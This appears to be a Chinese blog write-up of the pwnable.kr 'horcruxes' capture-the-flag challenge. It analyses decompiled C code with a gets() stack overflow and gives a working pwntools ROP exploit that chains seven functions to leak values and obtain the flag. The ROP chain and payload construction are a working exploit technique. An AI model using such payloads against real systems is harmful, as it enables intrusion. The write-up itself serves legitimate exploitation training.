---
title: kr_horcruxes
date: 2020-02-05 20:16:55
tags:
- pwn
- pwnable.kr
---

# pwnable.kr horcruxes

### 0x1 分析

看一下安全性：

<img src="https://i.loli.net/2020/02/05/yxpg1LhjCoVS3vd.png" style="zoom:67%;" />

没有开canary，但是栈上的数据无法执行，地址是固定的。

看一下函数列表：

<img src="https://i.loli.net/2020/02/05/b6UIQpsjEO7J8AX.png" style="zoom:50%;" />

有点乱。先看`main`吧。

`main`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ST1C_4

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  alarm(0x3Cu);
  hint();
  init_ABCDEFG();
  v3 = seccomp_init(0);									//沙箱机制
  seccomp_rule_add(v3, 2147418112, 173, 0);
  seccomp_rule_add(v3, 2147418112, 5, 0);
  seccomp_rule_add(v3, 2147418112, 3, 0);
  seccomp_rule_add(v3, 2147418112, 4, 0);
  seccomp_rule_add(v3, 2147418112, 252, 0);
  seccomp_load(v3);
  return ropme();
}
```

按照逻辑，来转到`init_ABCDEFG();`函数：

```c
unsigned int init_ABCDEFG()
{
  int v0; // eax
  unsigned int result; // eax
  unsigned int buf; // [esp+8h] [ebp-10h]
  int fd; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  if ( read(fd, &buf, 4u) != 4 )
  {
    puts("/dev/urandom error");
    exit(0);
  }
  close(fd);
  srand(buf);
  a = -559038737 * rand() % 0xCAFEBABE;
  b = -559038737 * rand() % 0xCAFEBABE;
  c = -559038737 * rand() % 0xCAFEBABE;
  d = -559038737 * rand() % 0xCAFEBABE;
  e = -559038737 * rand() % 0xCAFEBABE;
  f = -559038737 * rand() % 0xCAFEBABE;
  v0 = rand();
  g = -559038737 * v0 % 0xCAFEBABE;
  result = f + e + d + c + b + a + -559038737 * v0 % 0xCAFEBABE;
  sum = result;
  return result;
}
```

这里给了几个变量的值包括`a b c d e f g sum`。

沙箱函数暂且不关注。跳过。

到了`ropme()`函数:

```c
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a )
  {
    A();
  }
  else if ( v2 == b )
  {
    B();
  }
  else if ( v2 == c )
  {
    C();
  }
  else if ( v2 == d )
  {
    D();
  }
  else if ( v2 == e )
  {
    E();
  }
  else if ( v2 == f )
  {
    F();
  }
  else if ( v2 == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

看到了栈溢出最爱的`gets`函数。所以。这里已经形成了思路：

- 思路一：

  构造ROP的`payload`来跳过判断语句里，也就是`fd = open("flag", 0);`，进而可以输出`flag`。

  **但是，发现不行。原因在于：**

  **`0xa`会被`gets`当作输入结束的信号(回车)，并且把`0xa`替换成`0x00`(\0)，最终导致没办法直接返回到`ropme()`函数中去。**

- 思路二：

  那么我们就算`sum`。然后通过判断，输出`flag`。

我们看一下上面那几个函数：`A();`之类的。

`printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);`

看来可以输出这个的值，我们知道`sum`也是由这几个值来计算的。

`result = f + e + d + c + b + a + g`

 `sum = result;`

那么。我们通过ROP依次跳转到这几个函数，然后计算`sum`。再回到`ropme`。拿到`flag`。

### 0x2 EXP

```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
s = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
p = s.connect_remote('localhost', 9032)

p.sendlineafter('Select Menu:', '8')
payload = 0x74*'a' + p32(0)
payload += p32(0x809fe4b)  #依次是各个函数的地址
payload += p32(0x809fe6a)  
payload += p32(0x809fe89)  
payload += p32(0x809fea8)  
payload += p32(0x809fec7)  
payload += p32(0x809fee6)  
payload += p32(0x809ff05)  
payload += p32(0x809fffc)  # main函数里的 call ropme
p.sendlineafter('How many EXP did you earned? :', payload)
p.recvline() 
sum = 0
for i in range(7): 
    s = p.recvline()
    n = int(s.strip('\n').split('+')[1][:-1])
    sum += n
print "Result: " + str(sum)
p.sendlineafter('Select Menu:', '8')
p.sendlineafter('How many EXP did you earned? :', '%d'%(sum))
p.interactive()
```



